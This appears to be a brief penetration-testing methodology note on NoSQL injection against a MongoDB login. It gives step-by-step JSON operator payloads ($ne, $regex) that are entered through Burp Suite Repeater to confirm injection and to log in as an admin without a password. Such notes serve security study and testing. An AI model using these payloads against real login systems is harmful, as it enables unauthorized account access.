## NoSQL Injection (MongoDB Login) – Methodology<br>
Read and modify the JSON input being sent to the server in Burp Suite Repeater.<br>
1. Test for Injection Support<br>
Set:<br>
`"username": {"$ne":""}`<br>
If login succeeds → injection is possible<br>

2. Test Regex Matching<br>
Set:<br>
`"username": {"$regex":"^wien.*"}`<br>
If login succeeds → regex is supported<br>

3. Trigger Multi-User Match<br>
Set both:<br>
`"username": {"$ne":""}, "password": {"$ne":""}`<br>
If error → multiple users matched (expected one)<br>

4. Target Admin or any privileged User<br>
Set:<br>
`"username": {"$regex":"^admin.*"}, "password": {"$ne":""}`<br>
Logs in as admin<br>
